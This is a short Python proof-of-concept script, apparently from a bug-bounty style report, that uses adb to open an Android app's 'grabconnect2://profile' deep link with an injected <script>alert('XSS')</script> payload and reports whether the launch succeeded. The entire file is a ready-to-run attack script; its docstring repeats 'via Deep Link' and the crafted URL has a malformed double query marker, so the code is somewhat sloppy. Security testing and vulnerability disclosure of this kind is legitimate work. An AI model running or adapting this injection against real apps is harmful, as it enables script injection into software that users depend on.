#!/usr/bin/env python3
"""
Proof of Concept for XSS via Deep Link via Deep Link
"""
import subprocess

def exploit():
    deep_link = "grabconnect2://profile?user_id=123?param=<script>alert('XSS')</script>"
    
    # Launch app with malicious deep link
    cmd = ['adb', 'shell', 'am', 'start', '-a', 
           'android.intent.action.VIEW', '-d', deep_link]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"[+] Exploit sent successfully")
        print(f"[+] Deep link: {deep_link}")
    else:
        print(f"[-] Failed: {result.stderr}")

if __name__ == "__main__":
    exploit()
